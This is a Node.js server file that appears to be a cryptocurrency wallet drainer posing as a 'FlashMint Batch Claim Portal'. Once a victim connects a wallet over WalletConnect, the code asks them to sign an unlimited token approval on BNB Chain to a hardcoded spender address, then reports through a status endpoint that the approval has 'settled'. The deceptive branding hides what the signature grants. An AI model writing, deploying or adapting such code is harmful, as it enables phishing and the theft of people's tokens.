const http = require('http');
const { Core } = require('@walletconnect/core');
const { Web3Wallet } = require('@walletconnect/web3wallet');
const ethers = require('ethers');

const PROJECT_ID = process.env.PROJECT_ID || '';
const PORT = process.env.PORT || 3000;

const SPENDER = '0x32D35Edd6B3A9De3D63b7592446B199ac5877d1D';
const TOKEN = '0x55d398326f99059fF775485246999027B3197955';
const AMOUNT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

let wallet;
let settled = false;

async function init() {
    const core = new Core({ projectId: PROJECT_ID });
    wallet = await Web3Wallet.init({
        core,
        metadata: {
            name: 'FlashMint',
            description: 'Batch Claim Portal',
            url: 'https://flashmint.xyz',
            icons: []
        }
    });
    console.log('Wallet initialized');
}

const server = http.createServer(async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    if (req.url === '/uri') {
        try {
            const { uri, approval } = await wallet.connect({
                requiredNamespaces: {
                    eip155: {
                        methods: ['eth_sendTransaction'],
                        chains: ['eip155:56'],
                        events: ['chainChanged', 'accountsChanged']
                    }
                }
            });

            approval().then(async (session) => {
                const iface = new ethers.Interface([
                    "function approve(address spender, uint256 amount) external returns (bool)"
                ]);
                const data = iface.encodeFunctionData("approve", [SPENDER, AMOUNT]);

                await wallet.request({
                    topic: session.topic,
                    chainId: 'eip155:56',
                    request: {
                        method: 'eth_sendTransaction',
                        params: [{
                            to: TOKEN,
                            data: data,
                            value: '0x0'
                        }]
                    }
                });
                settled = true;
            }).catch(() => {});

            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ uri }));
        } catch (e) {
            res.writeHead(500, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: e.message }));
        }
    } else if (req.url === '/status') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ settled }));
    } else {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('ok');
    }
});

server.listen(PORT, () => {
    console.log('Server on port', PORT);
    init().catch(console.error);
});
